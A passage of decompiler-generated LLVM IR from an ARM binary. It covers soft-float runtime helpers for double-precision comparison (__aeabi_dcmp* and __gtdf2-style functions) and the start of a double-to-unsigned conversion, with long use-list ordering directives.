  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 159, 10, 11, 156, 17, 16, 18, 12, 13, 14, 15, 19, 20, 21, 22, 23, 168, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 59, 60, 61, 62, 63, 64, 65, 68, 66, 67, 69, 70, 71, 72, 73, 160, 74, 75, 77, 78, 76, 79, 161, 165, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 157, 107, 108, 170, 109, 171, 110, 172, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 158, 1, 125, 124, 123, 128, 127, 126, 129, 130, 131, 132, 169, 133, 134, 135, 155, 140, 136, 137, 141, 138, 139, 142, 147, 143, 144, 146, 145, 148, 150, 149, 173, 166, 151, 174, 152, 153, 167, 154, 162, 163, 164 }
  uselistorder i32 1048576, { 19, 0, 1, 2, 20, 21, 13, 3, 4, 5, 22, 6, 7, 23, 24, 14, 15, 8, 9, 25, 26, 27, 18, 28, 10, 16, 11, 17, 12 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 34, 366, 367, 368, 369, 370, 371, 270, 271, 272, 273, 274, 275, 134, 35, 32, 135, 96, 3, 97, 98, 99, 100, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 28, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 5, 4, 101, 102, 103, 104, 105, 306, 6, 307, 308, 309, 310, 311, 312, 313, 106, 29, 107, 108, 109, 136, 137, 458, 454, 455, 33, 456, 26, 457, 393, 401, 402, 391, 392, 403, 7, 404, 405, 406, 194, 195, 314, 319, 318, 320, 321, 322, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 394, 395, 396, 397, 398, 8, 9, 399, 400, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 132, 130, 131, 133, 138, 139, 140, 459, 460, 464, 465, 141, 142, 143, 461, 10, 462, 463, 407, 408, 409, 410, 411, 47, 48, 12, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 11, 63, 62, 61, 64, 412, 413, 13, 414, 415, 451, 452, 453, 144, 145, 146, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 14, 427, 428, 429, 436, 437, 438, 439, 430, 431, 432, 433, 434, 435, 468, 494, 241, 242, 243, 147, 148, 149, 219, 220, 221, 222, 150, 151, 223, 224, 225, 226, 227, 228, 229, 230, 471, 472, 473, 474, 466, 467, 354, 355, 15, 356, 357, 358, 359, 360, 361, 372, 16, 373, 374, 440, 441, 442, 443, 444, 445, 446, 447, 331, 17, 0, 325, 326, 327, 328, 329, 18, 30, 330, 323, 2, 324, 448, 19, 449, 450, 332, 20, 333, 334, 231, 21, 232, 233, 375, 376, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 65, 66, 67, 377, 378, 379, 380, 490, 491, 492, 493, 36, 335, 336, 337, 338, 22, 339, 340, 341, 342, 315, 316, 317, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 234, 235, 236, 237, 238, 239, 240, 205, 162, 163, 23, 164, 475, 476, 24, 477, 478, 165, 166, 167, 27, 168, 37, 169, 170, 171, 172, 1, 479, 480, 481, 482, 483, 484, 485, 486, 489, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 487, 488, 184, 196, 197, 199, 198, 264, 265, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 362, 363, 364, 365, 256, 257, 258, 259, 248, 249, 250, 251, 260, 261, 262, 263, 86, 87, 88, 89, 90, 91, 92, 93, 252, 253, 254, 255, 94, 95, 244, 245, 246, 247, 185, 25, 186, 187, 188, 189, 190, 191, 192, 31, 193, 469, 470, 200, 201, 202, 203, 204, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 266, 267, 268, 269, 38, 39, 40, 41, 42, 43, 44, 45, 46, 217, 218 }
  uselistorder i32* @r5, { 581, 582, 583, 62, 584, 585, 586, 587, 588, 589, 590, 591, 140, 141, 592, 142, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 456, 457, 458, 459, 460, 461, 462, 12, 463, 464, 190, 191, 192, 193, 63, 64, 65, 66, 194, 195, 196, 197, 143, 144, 145, 146, 147, 148, 149, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 8, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 55, 150, 13, 5, 151, 492, 496, 493, 494, 495, 48, 501, 497, 498, 499, 500, 14, 56, 152, 153, 154, 155, 198, 199, 200, 201, 745, 748, 746, 15, 747, 156, 157, 158, 159, 164, 165, 166, 648, 649, 662, 663, 664, 665, 16, 666, 667, 502, 503, 504, 604, 17, 605, 644, 645, 646, 647, 505, 506, 507, 508, 509, 510, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 18, 679, 680, 335, 336, 337, 338, 681, 682, 683, 684, 685, 244, 245, 246, 511, 517, 19, 519, 518, 6, 520, 20, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 558, 557, 50, 559, 95, 96, 97, 98, 650, 651, 652, 653, 654, 21, 655, 656, 657, 658, 160, 22, 161, 23, 162, 163, 167, 168, 169, 170, 171, 172, 173, 175, 57, 174, 176, 177, 178, 180, 58, 179, 181, 182, 183, 184, 185, 186, 187, 188, 189, 202, 203, 204, 749, 750, 751, 756, 206, 205, 7, 752, 753, 754, 755, 207, 208, 209, 210, 659, 660, 661, 211, 212, 213, 214, 215, 24, 216, 217, 218, 219, 220, 686, 687, 688, 689, 690, 691, 692, 221, 222, 223, 224, 693, 694, 695, 99, 100, 101, 102, 103, 104, 105, 106, 107, 225, 226, 227, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 51, 743, 744, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 25, 26, 240, 241, 27, 242, 243, 379, 380, 381, 382, 383, 384, 770, 771, 713, 714, 715, 716, 717, 718, 719, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 720, 721, 0, 722, 728, 729, 730, 731, 732, 723, 724, 28, 726, 725, 727, 784, 817, 818, 819, 820, 821, 416, 417, 418, 419, 420, 421, 339, 340, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 385, 29, 11, 386, 387, 388, 389, 257, 258, 259, 260, 390, 391, 392, 393, 394, 395, 396, 397, 796, 800, 801, 802, 803, 804, 757, 758, 759, 767, 768, 769, 760, 761, 762, 763, 764, 765, 766, 422, 423, 424, 261, 262, 263, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 822, 823, 824, 825, 606, 607, 30, 608, 609, 610, 611, 733, 31, 734, 735, 736, 737, 738, 32, 530, 531, 532, 521, 33, 526, 527, 528, 529, 522, 34, 523, 524, 525, 739, 740, 741, 742, 533, 534, 535, 536, 398, 399, 400, 401, 612, 613, 59, 614, 615, 35, 616, 617, 618, 619, 620, 621, 52, 622, 623, 624, 625, 60, 629, 36, 630, 631, 632, 633, 634, 635, 636, 637, 9, 638, 639, 640, 641, 642, 643, 108, 109, 626, 1, 627, 628, 265, 264, 49, 826, 827, 828, 829, 537, 538, 539, 540, 541, 37, 542, 543, 571, 572, 573, 574, 575, 576, 512, 513, 514, 515, 516, 38, 266, 267, 268, 269, 270, 273, 271, 272, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 805, 354, 785, 786, 787, 788, 2, 789, 790, 274, 275, 276, 277, 807, 806, 278, 279, 280, 281, 282, 283, 67, 68, 69, 70, 284, 285, 110, 111, 286, 287, 288, 289, 39, 290, 291, 292, 71, 72, 73, 74, 75, 76, 77, 445, 78, 79, 82, 87, 83, 80, 81, 84, 85, 86, 797, 798, 799, 293, 294, 295, 53, 296, 297, 298, 808, 811, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 809, 810, 317, 318, 319, 320, 321, 322, 341, 342, 343, 352, 344, 345, 346, 347, 348, 349, 350, 40, 351, 323, 446, 447, 448, 449, 324, 112, 113, 114, 115, 116, 117, 118, 119, 120, 812, 813, 814, 815, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 412, 413, 414, 415, 577, 578, 579, 580, 437, 438, 439, 440, 429, 430, 431, 432, 441, 442, 443, 444, 131, 132, 133, 134, 433, 434, 435, 436, 135, 136, 425, 426, 427, 428, 325, 326, 327, 329, 3, 330, 328, 816, 54, 41, 331, 332, 333, 334, 791, 792, 793, 794, 795, 137, 4, 138, 139, 353, 10, 355, 356, 357, 358, 359, 360, 42, 361, 362, 363, 364, 450, 451, 452, 43, 453, 454, 455, 365, 45, 88, 89, 90, 44, 91, 92, 93, 94, 366, 61, 371, 372, 373, 374, 375, 376, 377, 378, 367, 368, 46, 47, 369, 370 }
  uselistorder i32 %arg4, { 3, 2, 5, 4, 9, 8, 7, 0, 1, 6, 10 }
  uselistorder i32 %arg3, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_1cd90, { 1, 0 }
  uselistorder label %dec_label_pc_1cd74, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_1cd40, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1cc38, { 1, 0 }
  uselistorder label %dec_label_pc_1cc20, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1cdb4 = call i32 @function_1cdc4()
  ret i32 %v0_1cdb4
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1cdbc = call i32 @function_1cdc4()
  ret i32 %v0_1cdbc

; uselistorder directives
  uselistorder i32 ()* @function_1cdc4, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1cdc0 = load i32, i32* @r0, align 4
  ret i32 %v0_1cdc0
}

define i32 @function_1cdc4() local_unnamed_addr {
dec_label_pc_1cdc4:
  %v0_1cdc4 = load i32, i32* @ip, align 4
  %v0_1cdc8 = load i32, i32* @r0, align 4
  %v2_1cdc8 = mul i32 %v0_1cdc8, 2
  %v2_1cdc8.off = add i32 %v2_1cdc8, 4194303
  %tmp = icmp ult i32 %v2_1cdc8.off, 2097152
  %v0_1cdd0 = load i32, i32* @r2, align 4
  %v2_1cdd0 = mul i32 %v0_1cdd0, 2
  br i1 %tmp, label %dec_label_pc_1ce20, label %bb

bb:                                               ; preds = %dec_label_pc_1cdc4
  %v2_1cdd0.off = add i32 %v2_1cdd0, 4194303
  %tmp26 = icmp ult i32 %v2_1cdd0.off, 2097152
  br i1 %tmp26, label %dec_label_pc_1ce14, label %dec_label_pc_1cddc

dec_label_pc_1cddc:                               ; preds = %dec_label_pc_1ce28, %dec_label_pc_1ce34, %bb
  %v0_1cddc = load i32, i32* @r1, align 4
  %v4_1cddc = or i32 %v0_1cddc, %v2_1cdc8
  %v6_1cddc = icmp eq i32 %v4_1cddc, 0
  br i1 %v6_1cddc, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_1cddc
  %v1_1cde0 = load i32, i32* @r3, align 4
  %v5_1cde0 = or i32 %v1_1cde0, %v2_1cdd0
  %v7_1cde0 = icmp eq i32 %v5_1cde0, 0
  br i1 %v7_1cde0, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1cddc, %bb14
  %v3_1cde4 = xor i32 %v0_1cdd0, %v0_1cdc8
  %v5_1cde4 = icmp eq i32 %v3_1cde4, 0
  br i1 %v5_1cde4, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1cde8.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_1cde8 = phi i32 [ %v2_1cde8.pre, %.thread..thread1_crit_edge ], [ %v1_1cde0, %bb14 ]
  %v5_1cde8 = icmp eq i32 %v2_1cde8, %v0_1cddc
  br i1 %v5_1cde8, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_1cdd0, %v0_1cdc8
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_1cdf8.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_1cde4, %.thread ]
  %v3_1cdf8 = icmp slt i32 %v2_1cdf8.pre-phi, 0
  br i1 %v3_1cdf8, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_1cdfc = icmp eq i32 %v0_1cdc8, %v0_1cdd0
  br i1 %v10_1cdfc, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_1ce00 = load i32, i32* @r3, align 4
  %v4_1ce00 = icmp ult i32 %v0_1cddc, %v2_1ce00
  br i1 %v4_1ce00, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_1cdfc = icmp ult i32 %v0_1cdc8, %v0_1cdd0
  br i1 %v4_1cdfc, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_1cdd0, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_1ce04 = and i32 %v0_1cdd0, 1073741824
  %v3_1ce04 = icmp eq i32 %v2_1ce04, 0
  %v4_1ce04 = ashr i32 %v0_1cdd0, 31
  br i1 %v3_1ce04, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_1ce08.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_1ce04, %bb19 ]
  %v5_1ce08 = sub nsw i32 -1, %v4_1ce08.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_1ce0c = phi i32 [ %v4_1ce04, %bb19 ], [ %v5_1ce08, %.thread7 ]
  %v1_1ce0c = or i32 %v0_1ce0c, 1
  ret i32 %v1_1ce0c

dec_label_pc_1ce14:                               ; preds = %bb
  br label %dec_label_pc_1ce28

dec_label_pc_1ce20:                               ; preds = %dec_label_pc_1cdc4
  %v0_1ce20 = load i32, i32* @r1, align 4
  %v4_1ce20 = mul i32 %v0_1cdc8, 4096
  %v5_1ce20 = or i32 %v0_1ce20, %v4_1ce20
  %v7_1ce20 = icmp eq i32 %v5_1ce20, 0
  br i1 %v7_1ce20, label %dec_label_pc_1ce20.dec_label_pc_1ce28_crit_edge, label %dec_label_pc_1ce3c

dec_label_pc_1ce20.dec_label_pc_1ce28_crit_edge:  ; preds = %dec_label_pc_1ce20
  %v2_1cdd0.off25 = add i32 %v2_1cdd0, 4194303
  %tmp27 = icmp ult i32 %v2_1cdd0.off25, 2097152
  br label %dec_label_pc_1ce28

dec_label_pc_1ce28:                               ; preds = %dec_label_pc_1ce20.dec_label_pc_1ce28_crit_edge, %dec_label_pc_1ce14
  %v3_1ce2c.pre-phi = phi i1 [ %tmp27, %dec_label_pc_1ce20.dec_label_pc_1ce28_crit_edge ], [ true, %dec_label_pc_1ce14 ]
  br i1 %v3_1ce2c.pre-phi, label %dec_label_pc_1ce34, label %dec_label_pc_1cddc

dec_label_pc_1ce34:                               ; preds = %dec_label_pc_1ce28
  %v0_1ce34 = load i32, i32* @r3, align 4
  %v4_1ce34 = mul i32 %v0_1cdd0, 4096
  %v5_1ce34 = or i32 %v0_1ce34, %v4_1ce34
  %v7_1ce34 = icmp eq i32 %v5_1ce34, 0
  br i1 %v7_1ce34, label %dec_label_pc_1cddc, label %dec_label_pc_1ce3c

dec_label_pc_1ce3c:                               ; preds = %dec_label_pc_1ce20, %dec_label_pc_1ce34
  ret i32 %v0_1cdc4

; uselistorder directives
  uselistorder i32 %v4_1ce04, { 1, 0 }
  uselistorder i32 %v1_1cde0, { 1, 0 }
  uselistorder i32 %v0_1cddc, { 2, 0, 1 }
  uselistorder i32 %v2_1cdd0, { 0, 2, 1 }
  uselistorder i32 %v0_1cdd0, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_1cdc8, { 1, 0 }
  uselistorder i32 %v0_1cdc8, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 31, { 19, 7, 5, 14, 15, 20, 6, 21, 1, 17, 18, 16, 4, 22, 3, 2, 0, 8, 10, 9, 11, 23, 24, 13, 25, 27, 12, 26 }
  uselistorder i32* @r3, { 42, 43, 1, 44, 45, 46, 0, 47, 3, 48, 32, 2, 33, 34, 53, 54, 35, 38, 39, 6, 7, 49, 50, 51, 52, 24, 25, 55, 58, 56, 57, 36, 40, 19, 41, 37, 12, 13, 15, 14, 59, 60, 61, 16, 17, 18, 8, 9, 29, 30, 10, 11, 26, 27, 21, 22, 4, 5, 20, 23, 28, 31 }
  uselistorder i32* @r1, {}
  uselistorder i32* @ip, { 11, 12, 13, 3, 14, 15, 16, 17, 18, 19, 20, 4, 5, 0, 6, 23, 24, 2, 21, 1, 22, 10, 7, 8, 9 }
  uselistorder label %dec_label_pc_1ce3c, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1cddc, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1ce44 = load i32, i32* @r0, align 4
  %v0_1ce48 = load i32, i32* @r2, align 4
  store i32 %v0_1ce48, i32* @r0, align 4
  store i32 %v0_1ce44, i32* @r2, align 4
  %v0_1ce5c = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1ce5c
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1ce60 = load i32, i32* @r0, align 4
  %v1_1ce64 = sext i32 %v3_1ce60 to i64
  %v2_1ce64 = bitcast i64 %v1_1ce64 to double
  %v3_1ce64 = load i32, i32* @r2, align 4
  %v4_1ce64 = sext i32 %v3_1ce64 to i64
  %v5_1ce64 = bitcast i64 %v4_1ce64 to double
  %v7_1ce64 = fcmp oeq double %v2_1ce64, %v5_1ce64
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1ce64 = fcmp ule double %v2_1ce64, %v5_1ce64
  %not.v7_1ce64 = xor i1 %v7_1ce64, true
  %v1_1ce68 = and i1 %not.v6_1ce64, %not.v7_1ce64
  store i1 %v7_1ce64, i1* @cpsr_z, align 1
  br i1 %v1_1ce68, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1ce64, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1ce60

; uselistorder directives
  uselistorder i1 %v7_1ce64, { 1, 2, 0 }
  uselistorder i32* @r2, { 24, 56, 57, 190, 191, 192, 11, 193, 194, 195, 196, 197, 143, 144, 12, 145, 146, 27, 58, 214, 147, 148, 15, 59, 60, 61, 149, 150, 151, 62, 215, 105, 7, 106, 212, 213, 152, 16, 216, 217, 227, 228, 94, 218, 219, 153, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 17, 18, 63, 21, 64, 220, 35, 36, 37, 19, 65, 66, 107, 108, 20, 8, 235, 236, 237, 238, 198, 199, 2, 221, 224, 225, 222, 223, 9, 200, 25, 265, 67, 239, 123, 124, 109, 68, 69, 139, 243, 244, 248, 249, 252, 250, 251, 245, 246, 247, 229, 230, 5, 231, 232, 110, 233, 234, 101, 100, 181, 182, 259, 28, 111, 201, 202, 203, 1, 263, 6, 264, 159, 160, 161, 157, 158, 226, 162, 112, 204, 205, 206, 207, 10, 208, 209, 3, 210, 0, 211, 184, 163, 164, 165, 185, 113, 186, 166, 154, 155, 156, 70, 71, 72, 73, 74, 75, 76, 257, 26, 258, 95, 240, 4, 241, 253, 77, 38, 78, 79, 255, 80, 81, 23, 82, 256, 83, 84, 85, 96, 97, 98, 86, 254, 29, 260, 261, 39, 40, 41, 42, 43, 44, 45, 46, 47, 187, 188, 133, 134, 125, 126, 135, 136, 48, 49, 50, 51, 127, 128, 52, 53, 120, 121, 87, 13, 88, 89, 90, 91, 92, 22, 242, 54, 14, 93, 99, 30, 31, 32, 33, 34, 102, 103, 55, 104, 262, 114, 115, 116, 117, 118, 119, 122, 129, 130, 131, 132, 137, 138, 140, 141, 142, 183, 189 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_1ce74 = load i32, i32* @lr, align 4
  %v0_1ce78 = call i32 @__aeabi_cdcmple()
  %v0_1ce7c = load i1, i1* @cpsr_z, align 1
  %.v0_1ce78. = zext i1 %v0_1ce7c to i32
  call void @__pseudo_branch(i32 %v0_1ce74)
  ret i32 %.v0_1ce78.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_1ce88 = load i32, i32* @lr, align 4
  %v0_1ce8c = call i32 @__aeabi_cdcmple()
  %v0_1ce90 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1ce90 to i32
  %.v0_1ce8c. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1ce88)
  ret i32 %.v0_1ce8c.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1ce9c = load i32, i32* @lr, align 4
  store i32 %v0_1ce9c, i32* %stack_var_-8, align 4
  %v0_1cea0 = call i32 @__aeabi_cdcmple()
  %v0_1cea4 = load i1, i1* @cpsr_z, align 1
  %v1_1cea4 = load i1, i1* @cpsr_c, align 1
  %v2_1cea4 = xor i1 %v1_1cea4, true
  %v3_1cea4 = or i1 %v0_1cea4, %v2_1cea4
  %.v0_1cea0 = select i1 %v3_1cea4, i32 1, i32 %v0_1cea0
  %v2_1cea8 = xor i1 %v0_1cea4, true
  %v3_1cea8 = and i1 %v1_1cea4, %v2_1cea8
  %..v0_1cea0 = select i1 %v3_1cea8, i32 0, i32 %.v0_1cea0
  %v2_1ceac = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1ceac)
  ret i32 %..v0_1cea0

; uselistorder directives
  uselistorder i1 %v1_1cea4, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1ceb0 = load i32, i32* @lr, align 4
  store i32 %v0_1ceb0, i32* %stack_var_-8, align 4
  %v0_1ceb4 = call i32 @__aeabi_cdrcmple()
  %v0_1ceb8 = load i1, i1* @cpsr_z, align 1
  %v1_1ceb8 = load i1, i1* @cpsr_c, align 1
  %v2_1ceb8 = xor i1 %v1_1ceb8, true
  %v3_1ceb8 = or i1 %v0_1ceb8, %v2_1ceb8
  %.v0_1ceb4 = select i1 %v3_1ceb8, i32 1, i32 %v0_1ceb4
  %v2_1cebc = xor i1 %v0_1ceb8, true
  %v3_1cebc = and i1 %v1_1ceb8, %v2_1cebc
  %..v0_1ceb4 = select i1 %v3_1cebc, i32 0, i32 %.v0_1ceb4
  %v2_1cec0 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1cec0)
  ret i32 %..v0_1ceb4

; uselistorder directives
  uselistorder i1 %v1_1ceb8, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 93, 1, 6, 7, 8, 9, 75, 76, 83, 77, 78, 79, 84, 10, 11, 12, 13, 14, 72, 80, 15, 16, 85, 18, 17, 19, 20, 21, 22, 23, 94, 88, 26, 27, 28, 29, 24, 25, 89, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 46, 43, 44, 47, 48, 71, 95, 49, 50, 51, 73, 52, 53, 54, 55, 74, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 90, 68, 69, 91, 92, 86, 87, 70, 81, 82 }
  uselistorder i1* @cpsr_z, { 26, 27, 28, 29, 30, 42, 43, 44, 45, 46, 47, 3, 4, 5, 35, 36, 37, 38, 6, 7, 39, 40, 49, 50, 51, 52, 53, 54, 55, 1, 56, 2, 8, 58, 9, 10, 48, 11, 12, 13, 60, 59, 61, 14, 15, 16, 41, 17, 18, 19, 20, 21, 57, 22, 0, 31, 32, 23, 33, 24, 25, 34, 62, 63, 64 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1cec4 = load i32, i32* @lr, align 4
  %v0_1cec8 = call i32 @__aeabi_cdrcmple()
  %v0_1cecc = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1cecc to i32
  %.v0_1cec8. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1cec4)
  ret i32 %.v0_1cec8.

; uselistorder directives
  uselistorder i1 false, { 49, 16, 17, 91, 92, 93, 94, 95, 96, 97, 98, 99, 2, 12, 50, 41, 51, 52, 53, 54, 55, 6, 101, 8, 56, 19, 57, 58, 59, 18, 60, 61, 63, 64, 65, 66, 67, 68, 69, 62, 20, 70, 32, 21, 33, 71, 72, 73, 23, 22, 13, 14, 74, 75, 76, 4, 5, 77, 34, 35, 78, 36, 37, 24, 44, 45, 9, 25, 79, 38, 39, 80, 81, 42, 43, 82, 83, 46, 47, 84, 85, 86, 87, 88, 89, 48, 100, 0, 1, 3, 29, 28, 30, 27, 10, 11, 26, 7, 40, 31, 15, 90, 102, 103, 104, 105 }
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
  uselistorder i32* @lr, { 19, 20, 21, 22, 23, 8, 128, 129, 130, 131, 132, 133, 134, 85, 86, 87, 30, 32, 31, 24, 25, 26, 27, 11, 12, 88, 91, 92, 93, 3, 94, 95, 96, 97, 28, 33, 34, 152, 186, 187, 98, 69, 70, 71, 151, 162, 163, 164, 60, 61, 99, 100, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 158, 159, 154, 155, 156, 157, 167, 168, 165, 166, 29, 35, 36, 37, 160, 161, 169, 170, 13, 14, 15, 16, 17, 38, 39, 40, 171, 172, 173, 174, 175, 185, 41, 42, 188, 194, 177, 176, 0, 178, 179, 1, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 4, 205, 206, 207, 5, 208, 209, 210, 6, 211, 212, 213, 214, 215, 216, 217, 218, 108, 180, 182, 135, 7, 137, 138, 136, 219, 220, 221, 193, 232, 233, 222, 223, 72, 43, 44, 79, 224, 230, 73, 74, 75, 76, 189, 190, 191, 192, 124, 231, 89, 90, 139, 140, 125, 126, 127, 106, 107, 104, 105, 183, 184, 109, 110, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 2, 181, 45, 46, 111, 112, 101, 102, 103, 65, 62, 47, 80, 225, 48, 49, 50, 51, 52, 53, 54, 55, 56, 229, 59, 57, 226, 227, 228, 64, 63, 66, 58, 67, 68, 81, 82, 83, 84, 9, 10, 18, 153, 77, 78 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1ced8 = icmp slt i32 %arg1, 0
  %v2_1ced8 = mul i32 %arg1, 2
  br i1 %v1_1ced8, label %dec_label_pc_1cf0c, label %dec_label_pc_1cee0

dec_label_pc_1cee0:                               ; preds = %entry
  %v1_1cee0 = add i32 %v2_1ced8, 2097152
  %v2_1cee0 = icmp ugt i32 %v2_1ced8, -2097153
  br i1 %v2_1cee0, label %dec_label_pc_1cf14, label %dec_label_pc_1cee8

dec_label_pc_1cee8:                               ; preds = %dec_label_pc_1cee0
  %v6_1cee0 = icmp slt i32 %v1_1cee0, 0
  br i1 %v6_1cee0, label %dec_label_pc_1ceec, label %dec_label_pc_1cf0c

dec_label_pc_1ceec:                               ; preds = %dec_label_pc_1cee8
  %v4_1cef0 = sdiv i32 %v1_1cee0, 2097152
  %v5_1cef0 = sub nsw i32 -993, %v4_1cef0
  %v11_1cef0 = icmp slt i32 %v5_1cef0, 0
  br i1 %v11_1cef0, label %dec_label_pc_1cf1c, label %dec_label_pc_1cef8

dec_label_pc_1cef8:                               ; preds = %dec_label_pc_1ceec
  %v3_1cef8 = mul i32 %arg1, 2048
  %v4_1cf00 = udiv i32 %arg2, 2097152
  %v1_1cefc = or i32 %v3_1cef8, %v4_1cf00
  %v5_1cf00 = or i32 %v1_1cefc, -2147483648
